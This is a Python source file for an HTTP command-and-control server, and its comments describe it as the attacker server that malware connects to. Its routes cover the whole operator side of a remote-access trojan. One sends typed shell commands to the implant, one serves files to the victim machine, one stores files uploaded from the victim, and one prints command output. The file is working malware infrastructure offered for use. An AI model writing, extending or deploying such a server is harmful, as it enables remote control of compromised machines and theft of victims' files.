from http.server import BaseHTTPRequestHandler, HTTPServer

import requests, urllib, cgi, sys, mimetypes, os



port = 80

#Here we are creating a http server using python's `http.server` library, This will be used by the malware to communicate with the attacker server
#Attacker server is basically a HTTP server and malware will communicate using HTTP protocol with the `attacker_server` and send results and take commands etc

#python3 -m http.server is a module that starts up a http server in any directory and we are able to access files in that directory using http protocol
#but here this is an actual http server where we can define routes, and program each route to do specific tasks and return specific responses not just files
#This is just like node's express.js where we program APIs or HTTP Servers

class myHandler(BaseHTTPRequestHandler):

    def do_GET(self):

        if '/connected' in self.path:

            parsed_url = urllib.parse.urlparse(self.path)

            captured_value = urllib.parse.parse_qs(parsed_url.query)['cdir'][0]

            cmd = input(captured_value+"> ")

            self.send_response(200)

            self.send_header('Content-type','text/plain')

            self.end_headers()

            self.wfile.write(cmd.encode())

            if "exit" in cmd:

                sys.exit(0)



        if '/uploadFile' in self.path:

            parsed_url = urllib.parse.urlparse(self.path)

            filename = urllib.parse.parse_qs(parsed_url.query)['filename'][0]

            if os.path.exists(filename):

                mimetype = mimetypes.MimeTypes().guess_type(filename)[0]

                self.send_response(200)

                self.send_header('Content-type', mimetype)

                self.send_header('Content-Disposition', 'attachment;'

                        'filename=%s' % filename)

                self.end_headers()

                with open(filename, 'rb') as f:

                    self.wfile.write(f.read())

            else:
                self.send_response(404)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write("File you are trying to upload does not exist".encode())
                print("File you are trying to upload does not exist")

        

    def do_POST(self):

        if self.path == '/storeFile':

            ctype, pdict = cgi.parse_header(self.headers.get('content-type'))

            if ctype == 'multipart/form-data':

                fs = cgi.FieldStorage(fp=self.rfile, headers = self.headers, environ = {"REQUEST_METHOD": "POST"})

                filename = fs.keys()[0]

                fs_up = fs[filename]

                with open(filename, "wb") as f:

                    f.write(fs_up.file.read())

                self.send_response(200)

                self.send_header('Content-type','text/plain')

                self.end_headers()

                self.wfile.write("OK".encode())

            else:

                print("File not found")

                self.send_response(200)

                self.send_header('Content-type','text/plain')

                self.end_headers()

                self.wfile.write("OK".encode())



        if self.path == '/result':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            res = post_data.decode().split("=")[1]
            print(urllib.parse.unquote(res).replace("+", " "))
            self.send_response(200)
            self.send_header('Content-type','text/plain')
            self.end_headers()
            self.wfile.write("OK".encode())

            

server = HTTPServer(('', port), myHandler)
print('Started httpserver on port', port)

#Wait forever for incoming http requests

try:
    server.serve_forever()

except KeyboardInterrupt:
    pass